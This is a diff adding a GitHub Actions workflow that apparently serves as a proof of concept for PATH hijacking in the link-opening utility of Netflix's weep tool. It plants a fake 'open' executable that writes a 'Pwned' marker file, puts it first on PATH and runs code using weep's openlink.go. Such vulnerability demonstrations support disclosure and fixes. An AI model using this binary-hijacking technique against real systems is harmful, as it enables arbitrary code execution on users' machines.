@@ -1,0 +1,29 @@
+name: Weep OpenLink PoC
+
+on: [push]
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Set up Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Create malicious 'open' binary
+        run: |
+          mkdir -p /tmp/fakebin
+          echo -e '#!/bin/bash\necho "Pwned" > /tmp/pwned' > /tmp/fakebin/open
+          chmod +x /tmp/fakebin/open
+          export PATH=/tmp/fakebin:$PATH
+
+          # Clone weep just for the util
+          git clone https://github.com/Netflix/weep.git
+          cp weep/pkg/util/openlink.go ./
+          
+          # Run main.go
+          go run main.go
+
+          echo "Output:"
+          cat /tmp/pwned || echo "Exploit failed"
